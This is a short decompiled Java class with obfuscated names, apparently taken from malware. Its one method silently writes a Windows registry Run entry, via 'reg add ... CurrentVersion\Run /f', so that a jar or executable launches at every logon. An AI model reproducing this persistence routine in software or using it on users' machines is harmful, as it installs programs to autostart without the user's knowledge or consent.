/*
 * Decompiled with CFR 0_124.
 */
package b;

import b.a;

public final class e
extends a {
    public e(String string, String string2, boolean bl) {
        super(string, string2, bl);
    }

    @Override
    public final void a() {
        String string;
        if (this.a) {
            string = String.valueOf(System.getProperty("java.home")) + "\\bin\\javaw.exe";
            string = String.valueOf(string) + " -jar \"" + this.c + "\"";
        } else {
            string = this.c;
        }
        Runtime.getRuntime().exec(new String[]{"reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", "/v", this.b, "/t", "REG_SZ", "/d", string, "/f"});
    }
}
